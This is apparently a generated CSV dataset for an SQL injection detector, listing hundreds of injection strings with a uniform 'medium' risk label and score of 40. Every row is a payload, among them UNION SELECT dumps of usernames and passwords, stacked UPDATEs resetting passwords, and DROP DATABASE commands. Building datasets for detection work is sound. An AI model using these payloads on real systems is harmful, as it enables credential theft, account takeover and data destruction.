query,risk,score
'; UPDATE users SET password='pass' -- ,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- -- ",medium,40
"' UNION SELECT username, password FROM users -- -- ",medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- # 8",medium,40
'; SELECT @@version -- # i,medium,40
1' OR 1=1; SELECT * FROM users -- # 4,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- -- ",medium,40
1' OR 1=1; SELECT * FROM users -- # v,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- -- ",medium,40
1' OR '1' = '1' GROUP BY 1 -- -- ,medium,40
'; SELECT COUNT(*) FROM users -- -- ,medium,40
' or 1=1 in (select * from users) -- -- ,medium,40
' UNION SELECT * FROM information_schema.tables -- -- ,medium,40
"' UNION ALL SELECT 1,2 FROM users -- -- ",medium,40
'; SELECT COUNT(*) FROM users -- -- ,medium,40
' HAVING 1=1 # # b,medium,40
'; SELECT COUNT(*) FROM users -- # 4,medium,40
1' OR 1=1; SELECT * FROM users -- -- ,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- -- ",medium,40
' or 1=1 in (select * from users) -- # n,medium,40
"' UNION ALL SELECT 1,2 FROM users -- # p",medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- -- ",medium,40
' or 1=1 in (select * from users) -- # s,medium,40
"' UNION SELECT username, password FROM users -- # c",medium,40
' or 1 = 1 LIMIT 1 -- -- ,medium,40
'; UPDATE users SET password='pass' # c,medium,40
"' UNION SELECT username, password FROM users -- # m",medium,40
'; UPDATE users SET password='pass' -- ,medium,40
1' OR 1=1; SELECT * FROM users -- -- ,medium,40
1' OR 1=1; SELECT * FROM users -- # x,medium,40
1' OR 1=1; SELECT * FROM users -- # n,medium,40
'; UPDATE users SET password='pass' # e,medium,40
'; DROP DATABASE temp -- -- ,medium,40
'; DROP DATABASE temp -- -- ,medium,40
' OR username LIKE '%admin%' -- -- ,medium,40
' UNION SELECT * FROM information_schema.tables -- -- ,medium,40
1' OR 1=1; SELECT * FROM users -- -- ,medium,40
'; UPDATE users SET password='pass' # 7,medium,40
1' OR 1=1; SELECT * FROM users -- # o,medium,40
'; DROP DATABASE temp -- -- ,medium,40
' or 1=1 in (select * from users) -- -- ,medium,40
1' OR '1' = '1' GROUP BY 1 -- -- ,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- -- ",medium,40
"' UNION SELECT username, password FROM users -- -- ",medium,40
'; DROP DATABASE temp -- # e,medium,40
' UNION SELECT * FROM information_schema.tables -- # 5,medium,40
'; SELECT COUNT(*) FROM users -- -- ,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- # d",medium,40
'; UPDATE users SET password='pass' # v,medium,40
' UNION SELECT * FROM information_schema.tables -- -- ,medium,40
' UNION SELECT * FROM information_schema.tables -- -- ,medium,40
'; SELECT @@version -- # q,medium,40
1' OR '1' = '1' GROUP BY 1 -- # j,medium,40
'; DROP DATABASE temp -- # y,medium,40
"' UNION ALL SELECT 1,2 FROM users -- -- ",medium,40
"' UNION ALL SELECT 1,2 FROM users -- # 7",medium,40
"' OR '1'='1' UNION SELECT 1,2 -- # i",medium,40
' HAVING 1=1 # # b,medium,40
'; SELECT COUNT(*) FROM users -- -- ,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- # z",medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- # k",medium,40
"' UNION SELECT username, password FROM users -- # 0",medium,40
1' OR 1=1; SELECT * FROM users -- # y,medium,40
1' OR '1' = '1' GROUP BY 1 -- # 3,medium,40
' HAVING 1=1 # -- ,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- -- ",medium,40
' UNION SELECT * FROM information_schema.tables -- # o,medium,40
'; SELECT @@version -- -- ,medium,40
1' OR 1=1; SELECT * FROM users -- -- ,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- -- ",medium,40
"' UNION SELECT username, password FROM users -- -- ",medium,40
'; SELECT @@version -- # s,medium,40
' UNION SELECT * FROM information_schema.tables -- # h,medium,40
'; SELECT COUNT(*) FROM users -- -- ,medium,40
'; DROP DATABASE temp -- # 4,medium,40
"' UNION ALL SELECT 1,2 FROM users -- -- ",medium,40
'; SELECT COUNT(*) FROM users -- -- ,medium,40
'; UPDATE users SET password='pass' # 5,medium,40
'; SELECT COUNT(*) FROM users -- # i,medium,40
'; DROP DATABASE temp -- # x,medium,40
'; DROP DATABASE temp -- # 9,medium,40
' or 1 = 1 LIMIT 1 -- -- ,medium,40
'; UPDATE users SET password='pass' # u,medium,40
'; SELECT @@version -- # 6,medium,40
1' OR 1=1; SELECT * FROM users -- -- ,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- # f",medium,40
' UNION SELECT * FROM information_schema.tables -- # i,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- # 3",medium,40
'; SELECT COUNT(*) FROM users -- # u,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- -- ",medium,40
'; DROP DATABASE temp -- # k,medium,40
'; SELECT COUNT(*) FROM users -- -- ,medium,40
'; DROP DATABASE temp -- -- ,medium,40
1' OR 1=1; SELECT * FROM users -- # 9,medium,40
'; SELECT COUNT(*) FROM users -- # o,medium,40
' UNION SELECT * FROM information_schema.tables -- # 7,medium,40
"' UNION ALL SELECT 1,2 FROM users -- -- ",medium,40
"' OR '1'='1' UNION SELECT 1,2 -- # 3",medium,40
' HAVING 1=1 # -- ,medium,40
' UNION SELECT * FROM information_schema.tables -- # 3,medium,40
'; SELECT @@version -- # y,medium,40
'; SELECT @@version -- # p,medium,40
' UNION SELECT * FROM information_schema.tables -- # i,medium,40
'; UPDATE users SET password='pass' -- ,medium,40
' OR username LIKE '%admin%' -- # f,medium,40
' UNION SELECT * FROM information_schema.tables -- # 3,medium,40
"' UNION ALL SELECT 1,2 FROM users -- # d",medium,40
1' OR 1=1; SELECT * FROM users -- -- ,medium,40
'; SELECT @@version -- # 9,medium,40
"' UNION ALL SELECT 1,2 FROM users -- # d",medium,40
' HAVING 1=1 # -- ,medium,40
1' OR 1=1; SELECT * FROM users -- # 3,medium,40
1' OR 1=1; SELECT * FROM users -- # p,medium,40
"' UNION ALL SELECT 1,2 FROM users -- -- ",medium,40
' OR username LIKE '%admin%' -- # q,medium,40
' or 1 = 1 LIMIT 1 -- -- ,medium,40
'; SELECT @@version -- # n,medium,40
1' OR '1' = '1' GROUP BY 1 -- -- ,medium,40
'; DROP DATABASE temp -- # 0,medium,40
'; DROP DATABASE temp -- -- ,medium,40
' or 1 = 1 LIMIT 1 -- -- ,medium,40
' UNION SELECT * FROM information_schema.tables -- # 6,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- -- ",medium,40
' or 1=1 in (select * from users) -- -- ,medium,40
' or 1 = 1 LIMIT 1 -- -- ,medium,40
' or 1=1 in (select * from users) -- -- ,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- -- ",medium,40
' HAVING 1=1 # # q,medium,40
' OR username LIKE '%admin%' -- -- ,medium,40
' or 1=1 in (select * from users) -- # k,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- # 4",medium,40
'; SELECT @@version -- -- ,medium,40
"' UNION ALL SELECT 1,2 FROM users -- # z",medium,40
1' OR '1' = '1' GROUP BY 1 -- # 8,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- -- ",medium,40
1' OR '1' = '1' GROUP BY 1 -- -- ,medium,40
' UNION SELECT * FROM information_schema.tables -- -- ,medium,40
1' OR 1=1; SELECT * FROM users -- # o,medium,40
' or 1 = 1 LIMIT 1 -- # p,medium,40
' OR username LIKE '%admin%' -- # h,medium,40
1' OR '1' = '1' GROUP BY 1 -- # w,medium,40
'; UPDATE users SET password='pass' # g,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- -- ",medium,40
"' UNION SELECT username, password FROM users -- # s",medium,40
'; SELECT @@version -- -- ,medium,40
'; UPDATE users SET password='pass' -- ,medium,40
1' OR 1=1; SELECT * FROM users -- -- ,medium,40
'; UPDATE users SET password='pass' # t,medium,40
"' UNION ALL SELECT 1,2 FROM users -- -- ",medium,40
' OR username LIKE '%admin%' -- -- ,medium,40
"' UNION ALL SELECT 1,2 FROM users -- # r",medium,40
' OR username LIKE '%admin%' -- -- ,medium,40
"' UNION SELECT username, password FROM users -- -- ",medium,40
1' OR 1=1; SELECT * FROM users -- -- ,medium,40
' HAVING 1=1 # -- ,medium,40
' UNION SELECT * FROM information_schema.tables -- # d,medium,40
'; SELECT COUNT(*) FROM users -- -- ,medium,40
'; UPDATE users SET password='pass' -- ,medium,40
' OR username LIKE '%admin%' -- # 4,medium,40
"' UNION ALL SELECT 1,2 FROM users -- -- ",medium,40
'; SELECT COUNT(*) FROM users -- -- ,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- -- ",medium,40
1' OR 1=1; SELECT * FROM users -- -- ,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- # p",medium,40
1' OR 1=1; SELECT * FROM users -- -- ,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- # 0",medium,40
'; SELECT COUNT(*) FROM users -- # f,medium,40
1' OR '1' = '1' GROUP BY 1 -- -- ,medium,40
'; SELECT @@version -- -- ,medium,40
"' UNION ALL SELECT 1,2 FROM users -- # a",medium,40
"' OR '1'='1' UNION SELECT 1,2 -- -- ",medium,40
1' OR 1=1; SELECT * FROM users -- -- ,medium,40
"' UNION ALL SELECT 1,2 FROM users -- # y",medium,40
' or 1 = 1 LIMIT 1 -- -- ,medium,40
' HAVING 1=1 # # u,medium,40
"' UNION SELECT username, password FROM users -- # b",medium,40
'; SELECT COUNT(*) FROM users -- -- ,medium,40
"' UNION SELECT username, password FROM users -- -- ",medium,40
"' OR '1'='1' UNION SELECT 1,2 -- # c",medium,40
' UNION SELECT * FROM information_schema.tables -- # e,medium,40
'; SELECT COUNT(*) FROM users -- -- ,medium,40
1' OR 1=1; SELECT * FROM users -- # y,medium,40
'; SELECT @@version -- # k,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- # k",medium,40
"' UNION SELECT username, password FROM users -- # g",medium,40
' or 1=1 in (select * from users) -- -- ,medium,40
'; SELECT @@version -- # t,medium,40
' or 1=1 in (select * from users) -- -- ,medium,40
' UNION SELECT * FROM information_schema.tables -- # l,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- -- ",medium,40
' OR username LIKE '%admin%' -- -- ,medium,40
"' UNION SELECT username, password FROM users -- # p",medium,40
"' UNION ALL SELECT 1,2 FROM users -- # 0",medium,40
'; DROP DATABASE temp -- # d,medium,40
'; UPDATE users SET password='pass' -- ,medium,40
' or 1=1 in (select * from users) -- # 9,medium,40
1' OR '1' = '1' GROUP BY 1 -- # j,medium,40
"' UNION ALL SELECT 1,2 FROM users -- -- ",medium,40
' UNION SELECT * FROM information_schema.tables -- -- ,medium,40
' HAVING 1=1 # # n,medium,40
1' OR 1=1; SELECT * FROM users -- -- ,medium,40
'; UPDATE users SET password='pass' -- ,medium,40
"' UNION SELECT username, password FROM users -- # 3",medium,40
' HAVING 1=1 # # j,medium,40
"' UNION ALL SELECT 1,2 FROM users -- -- ",medium,40
"' UNION SELECT username, password FROM users -- -- ",medium,40
'; DROP DATABASE temp -- -- ,medium,40
' OR username LIKE '%admin%' -- # 3,medium,40
' HAVING 1=1 # -- ,medium,40
'; SELECT @@version -- -- ,medium,40
' UNION SELECT * FROM information_schema.tables -- -- ,medium,40
'; SELECT COUNT(*) FROM users -- # b,medium,40
"' UNION SELECT username, password FROM users -- # 1",medium,40
1' OR '1' = '1' GROUP BY 1 -- -- ,medium,40
'; SELECT COUNT(*) FROM users -- -- ,medium,40
'; UPDATE users SET password='pass' -- ,medium,40
'; SELECT COUNT(*) FROM users -- # 2,medium,40
' OR username LIKE '%admin%' -- # z,medium,40
'; SELECT @@version -- # z,medium,40
' or 1 = 1 LIMIT 1 -- # d,medium,40
1' OR 1=1; SELECT * FROM users -- # u,medium,40
'; UPDATE users SET password='pass' -- ,medium,40
' OR username LIKE '%admin%' -- -- ,medium,40
' or 1 = 1 LIMIT 1 -- # i,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- # j",medium,40
'; DROP DATABASE temp -- # u,medium,40
' OR username LIKE '%admin%' -- # t,medium,40
"' UNION ALL SELECT 1,2 FROM users -- -- ",medium,40
'; UPDATE users SET password='pass' # 8,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- -- ",medium,40
1' OR 1=1; SELECT * FROM users -- -- ,medium,40
1' OR 1=1; SELECT * FROM users -- -- ,medium,40
1' OR 1=1; SELECT * FROM users -- -- ,medium,40
' OR username LIKE '%admin%' -- -- ,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- # 4",medium,40
"' UNION SELECT username, password FROM users -- # w",medium,40
'; SELECT COUNT(*) FROM users -- -- ,medium,40
'; DROP DATABASE temp -- # w,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- # l",medium,40
' or 1=1 in (select * from users) -- -- ,medium,40
1' OR 1=1; SELECT * FROM users -- -- ,medium,40
' HAVING 1=1 # # k,medium,40
"' UNION SELECT username, password FROM users -- # f",medium,40
' or 1=1 in (select * from users) -- # g,medium,40
' OR username LIKE '%admin%' -- # h,medium,40
' OR username LIKE '%admin%' -- # s,medium,40
'; SELECT @@version -- # c,medium,40
' or 1 = 1 LIMIT 1 -- # y,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- -- ",medium,40
1' OR '1' = '1' GROUP BY 1 -- -- ,medium,40
"' UNION ALL SELECT 1,2 FROM users -- -- ",medium,40
"' UNION SELECT username, password FROM users -- # z",medium,40
'; SELECT @@version -- -- ,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- # g",medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- -- ",medium,40
'; SELECT @@version -- # 0,medium,40
1' OR '1' = '1' GROUP BY 1 -- # o,medium,40
' or 1 = 1 LIMIT 1 -- # h,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- -- ",medium,40
1' OR '1' = '1' GROUP BY 1 -- # q,medium,40
"' UNION SELECT username, password FROM users -- # j",medium,40
'; SELECT @@version -- # 1,medium,40
' UNION SELECT * FROM information_schema.tables -- # v,medium,40
' or 1 = 1 LIMIT 1 -- # p,medium,40
1' OR 1=1; SELECT * FROM users -- # l,medium,40
'; SELECT @@version -- -- ,medium,40
"' UNION SELECT username, password FROM users -- # g",medium,40
' or 1=1 in (select * from users) -- -- ,medium,40
'; DROP DATABASE temp -- # w,medium,40
' or 1 = 1 LIMIT 1 -- -- ,medium,40
1' OR '1' = '1' GROUP BY 1 -- # b,medium,40
' HAVING 1=1 # # v,medium,40
' or 1=1 in (select * from users) -- -- ,medium,40
"' UNION ALL SELECT 1,2 FROM users -- -- ",medium,40
1' OR '1' = '1' GROUP BY 1 -- -- ,medium,40
1' OR 1=1; SELECT * FROM users -- -- ,medium,40
'; DROP DATABASE temp -- # r,medium,40
'; SELECT @@version -- # 5,medium,40
' or 1=1 in (select * from users) -- # r,medium,40
"' UNION SELECT username, password FROM users -- -- ",medium,40
' or 1=1 in (select * from users) -- -- ,medium,40
' OR username LIKE '%admin%' -- # r,medium,40
' HAVING 1=1 # # c,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- # f",medium,40
1' OR '1' = '1' GROUP BY 1 -- -- ,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- -- ",medium,40
1' OR '1' = '1' GROUP BY 1 -- -- ,medium,40
1' OR '1' = '1' GROUP BY 1 -- -- ,medium,40
1' OR '1' = '1' GROUP BY 1 -- -- ,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- -- ",medium,40
"' UNION SELECT username, password FROM users -- -- ",medium,40
'; UPDATE users SET password='pass' -- ,medium,40
1' OR 1=1; SELECT * FROM users -- # 5,medium,40
'; DROP DATABASE temp -- -- ,medium,40
'; DROP DATABASE temp -- -- ,medium,40
1' OR '1' = '1' GROUP BY 1 -- # o,medium,40
'; SELECT @@version -- # 9,medium,40
' HAVING 1=1 # # 7,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- # 3",medium,40
1' OR '1' = '1' GROUP BY 1 -- # 6,medium,40
'; SELECT COUNT(*) FROM users -- # j,medium,40
1' OR '1' = '1' GROUP BY 1 -- # i,medium,40
'; DROP DATABASE temp -- # 7,medium,40
'; SELECT @@version -- -- ,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- # l",medium,40
'; SELECT COUNT(*) FROM users -- # m,medium,40
"' UNION ALL SELECT 1,2 FROM users -- # g",medium,40
' HAVING 1=1 # -- ,medium,40
' HAVING 1=1 # # r,medium,40
' OR username LIKE '%admin%' -- # 2,medium,40
' UNION SELECT * FROM information_schema.tables -- -- ,medium,40
'; SELECT @@version -- # f,medium,40
' or 1=1 in (select * from users) -- -- ,medium,40
'; SELECT COUNT(*) FROM users -- -- ,medium,40
'; UPDATE users SET password='pass' -- ,medium,40
' HAVING 1=1 # -- ,medium,40
'; UPDATE users SET password='pass' -- ,medium,40
' UNION SELECT * FROM information_schema.tables -- # n,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- -- ",medium,40
"' UNION ALL SELECT 1,2 FROM users -- -- ",medium,40
'; UPDATE users SET password='pass' -- ,medium,40
' or 1 = 1 LIMIT 1 -- # 7,medium,40
"' UNION SELECT username, password FROM users -- # d",medium,40
' OR username LIKE '%admin%' -- # 0,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- -- ",medium,40
"' UNION ALL SELECT 1,2 FROM users -- -- ",medium,40
'; DROP DATABASE temp -- -- ,medium,40
' or 1=1 in (select * from users) -- # 5,medium,40
'; SELECT @@version -- -- ,medium,40
1' OR 1=1; SELECT * FROM users -- # q,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- # f",medium,40
"' UNION SELECT username, password FROM users -- # 7",medium,40
' UNION SELECT * FROM information_schema.tables -- # 3,medium,40
'; DROP DATABASE temp -- # r,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- # u",medium,40
' or 1 = 1 LIMIT 1 -- # u,medium,40
1' OR '1' = '1' GROUP BY 1 -- -- ,medium,40
'; UPDATE users SET password='pass' -- ,medium,40
'; DROP DATABASE temp -- -- ,medium,40
'; SELECT @@version -- -- ,medium,40
"' UNION ALL SELECT 1,2 FROM users -- # 7",medium,40
1' OR 1=1; SELECT * FROM users -- # z,medium,40
' UNION SELECT * FROM information_schema.tables -- -- ,medium,40
'; SELECT @@version -- # y,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- -- ",medium,40
' or 1=1 in (select * from users) -- -- ,medium,40
' HAVING 1=1 # # v,medium,40
"' UNION ALL SELECT 1,2 FROM users -- -- ",medium,40
' or 1 = 1 LIMIT 1 -- # x,medium,40
' or 1 = 1 LIMIT 1 -- # 9,medium,40
1' OR '1' = '1' GROUP BY 1 -- # x,medium,40
"' UNION ALL SELECT 1,2 FROM users -- -- ",medium,40
'; SELECT @@version -- # b,medium,40
' OR username LIKE '%admin%' -- # l,medium,40
' or 1 = 1 LIMIT 1 -- # w,medium,40
"' UNION SELECT username, password FROM users -- -- ",medium,40
"' UNION ALL SELECT 1,2 FROM users -- -- ",medium,40
' HAVING 1=1 # -- ,medium,40
1' OR 1=1; SELECT * FROM users -- -- ,medium,40
' or 1=1 in (select * from users) -- -- ,medium,40
'; UPDATE users SET password='pass' -- ,medium,40
"' UNION ALL SELECT 1,2 FROM users -- -- ",medium,40
"' UNION ALL SELECT 1,2 FROM users -- # 8",medium,40
' or 1 = 1 LIMIT 1 -- # j,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- -- ",medium,40
"' UNION SELECT username, password FROM users -- # t",medium,40
"' UNION ALL SELECT 1,2 FROM users -- # p",medium,40
' or 1=1 in (select * from users) -- -- ,medium,40
' or 1=1 in (select * from users) -- -- ,medium,40
' or 1 = 1 LIMIT 1 -- -- ,medium,40
'; UPDATE users SET password='pass' # f,medium,40
1' OR 1=1; SELECT * FROM users -- -- ,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- -- ",medium,40
"' UNION SELECT username, password FROM users -- -- ",medium,40
1' OR '1' = '1' GROUP BY 1 -- -- ,medium,40
'; SELECT @@version -- # 1,medium,40
'; SELECT @@version -- -- ,medium,40
'; UPDATE users SET password='pass' # o,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- -- ",medium,40
' OR username LIKE '%admin%' -- # 6,medium,40
"' UNION ALL SELECT 1,2 FROM users -- # s",medium,40
'; DROP DATABASE temp -- # k,medium,40
"' UNION ALL SELECT 1,2 FROM users -- # w",medium,40
'; DROP DATABASE temp -- -- ,medium,40
"' UNION SELECT username, password FROM users -- # a",medium,40
' UNION SELECT * FROM information_schema.tables -- -- ,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- # s",medium,40
' HAVING 1=1 # -- ,medium,40
'; UPDATE users SET password='pass' -- ,medium,40
' UNION SELECT * FROM information_schema.tables -- -- ,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- # y",medium,40
'; SELECT COUNT(*) FROM users -- -- ,medium,40
' UNION SELECT * FROM information_schema.tables -- -- ,medium,40
1' OR '1' = '1' GROUP BY 1 -- # g,medium,40
' or 1=1 in (select * from users) -- -- ,medium,40
"' UNION ALL SELECT 1,2 FROM users -- -- ",medium,40
'; DROP DATABASE temp -- -- ,medium,40
' HAVING 1=1 # # s,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- -- ",medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- -- ",medium,40
' UNION SELECT * FROM information_schema.tables -- # e,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- # j",medium,40
' OR username LIKE '%admin%' -- -- ,medium,40
' OR username LIKE '%admin%' -- # 0,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- -- ",medium,40
' HAVING 1=1 # -- ,medium,40
"' UNION ALL SELECT 1,2 FROM users -- # w",medium,40
'; DROP DATABASE temp -- -- ,medium,40
'; SELECT @@version -- -- ,medium,40
"' UNION SELECT username, password FROM users -- # a",medium,40
'; SELECT COUNT(*) FROM users -- # 2,medium,40
'; DROP DATABASE temp -- -- ,medium,40
'; DROP DATABASE temp -- -- ,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- # n",medium,40
'; SELECT COUNT(*) FROM users -- # m,medium,40
'; UPDATE users SET password='pass' -- ,medium,40
"' UNION ALL SELECT 1,2 FROM users -- -- ",medium,40
'; SELECT @@version -- -- ,medium,40
'; DROP DATABASE temp -- # v,medium,40
